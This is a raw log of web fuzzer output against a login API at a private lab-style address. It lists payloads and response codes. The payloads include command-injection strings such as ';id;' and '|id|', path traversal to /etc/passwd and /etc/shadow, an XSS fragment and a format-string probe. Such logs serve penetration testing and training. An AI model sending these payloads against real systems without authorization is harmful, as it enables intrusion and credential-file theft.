Target: http://10.10.10.16/api/login
Total requests: 468
==============================================================================================================================================
ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Payload    
==============================================================================================================================================
00015:  0.106s   C=00015:  C=200      0 L	       2 W	     21 Ch                                                                              "-268435455"
00031:  0.106s   C=00031:  C=200      0 L	       2 W	     21 Ch                                                                              "\00\00\00"
00001:  0.107s   C=00001:  C=200      0 L	       2 W	     21 Ch                                                                              "A"
00003:  0.108s   C=00003:  C=200      0 L	       2 W	     21 Ch                                                                              "FALSE"
00007:  0.108s   C=00007:  C=200      0 L	       2 W	     21 Ch                                                                              "-1"
00036:  0.108s   C=00036:  C=400      0 L	       2 W	     21 Ch                                                                              ";id;"
00038:  0.108s   C=00038:  C=400      0 L	       2 W	     21 Ch                                                                              ";netstat -a;"
00040:  0.108s   C=00040:  C=200      0 L	       2 W	     21 Ch                                                                              "\"blah"
00037:  0.108s   C=00037:  C=400      0 L	       2 W	     21 Ch                                                                              ";read;"
00039:  0.108s   C=00039:  C=400      0 L	       2 W	     21 Ch                                                                              "\nnetstat -a%\n"
00035:  0.052s   C=00035:  C=200      0 L	       2 W	     21 Ch                                                                              "`dir`"
00034:  0.051s   C=00034:  C=200      0 L	       2 W	     21 Ch                                                                              "`id`"
00033:  0.051s   C=00033:  C=200      0 L	       2 W	     21 Ch                                                                              "$NULL"
00029:  0.051s   C=00029:  C=200      0 L	       2 W	     21 Ch                                                                              "\00"
00030:  0.051s   C=00030:  C=200      0 L	       2 W	     21 Ch                                                                              "\00\00"
00027:  0.052s   C=00027:  C=200      0 L	       2 W	     21 Ch                                                                              "\0\0"
00032:  0.051s   C=00032:  C=200      0 L	       2 W	     21 Ch                                                                              "$null"
00028:  0.054s   C=00028:  C=200      0 L	       2 W	     21 Ch                                                                              "\0\0\0"
00026:  0.054s   C=00026:  C=200      0 L	       2 W	     21 Ch                                                                              "\0"
00025:  0.054s   C=00025:  C=200      0 L	       2 W	     21 Ch                                                                              "+%00"
00024:  0.050s   C=00024:  C=200      0 L	       2 W	     21 Ch                                                                              "%00"
00021:  0.050s   C=00021:  C=200      0 L	       2 W	     21 Ch                                                                              "\00"
00023:  0.050s   C=00023:  C=200      0 L	       2 W	     21 Ch                                                                              "%0a"
00022:  0.050s   C=00022:  C=200      0 L	       2 W	     21 Ch                                                                              "<  script > < / script>"
00020:  0.050s   C=00020:  C=200      0 L	       2 W	     21 Ch                                                                              "\0"
00019:  0.048s   C=00019:  C=200      0 L	       2 W	     21 Ch                                                                              "null"
00018:  0.049s   C=00018:  C=200      0 L	       2 W	     21 Ch                                                                              "NULL"
00014:  0.049s   C=00014:  C=200      0 L	       2 W	     21 Ch                                                                              "268435455"
00016:  0.049s   C=00016:  C=200      0 L	       2 W	     21 Ch                                                                              "2147483647"
00017:  0.052s   C=00017:  C=200      0 L	       2 W	     21 Ch                                                                              "0xfffffff"
00011:  0.056s   C=00011:  C=200      0 L	       2 W	     21 Ch                                                                              "-2"
00005:  0.053s   C=00005:  C=200      0 L	       2 W	     21 Ch                                                                              "00"
00009:  0.055s   C=00009:  C=200      0 L	       2 W	     21 Ch                                                                              "-1.0"
00004:  0.051s   C=00004:  C=200      0 L	       2 W	     21 Ch                                                                              "0"
00013:  0.056s   C=00013:  C=200      0 L	       2 W	     21 Ch                                                                              "65536"
00006:  0.055s   C=00006:  C=200      0 L	       2 W	     21 Ch                                                                              "1"
00002:  0.053s   C=00002:  C=200      0 L	       2 W	     21 Ch                                                                              "TRUE"
00010:  0.055s   C=00010:  C=200      0 L	       2 W	     21 Ch                                                                              "2"
00008:  0.055s   C=00008:  C=200      0 L	       2 W	     21 Ch                                                                              "1.0"
00012:  0.056s   C=00012:  C=200      0 L	       2 W	     21 Ch                                                                              "-20"
00041:  0.049s   C=00041:  C=200      0 L	       2 W	     21 Ch                                                                              "|id|"
00043:  0.049s   C=00043:  C=200      0 L	       2 W	     21 Ch                                                                              "id%00"
00068:  0.049s   C=00068:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../etc/passwd"
00047:  0.049s   C=00047:  C=200      0 L	       2 W	     21 Ch                                                                              "|dir|"
00069:  0.049s   C=00069:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../etc/shadow%00"
00064:  0.050s   C=00064:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../etc/hosts"
00065:  0.050s   C=00065:  C=200      0 L	       2 W	     21 Ch                                                                              "../../boot.ini"
00055:  0.049s   C=00055:  C=200      0 L	       2 W	     21 Ch                                                                              "?x=""
00066:  0.050s   C=00066:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../%2A"
00067:  0.051s   C=00067:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../etc/passwd%00"
00062:  0.056s   C=00062:  C=400      0 L	       2 W	     21 Ch                                                                              "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|"
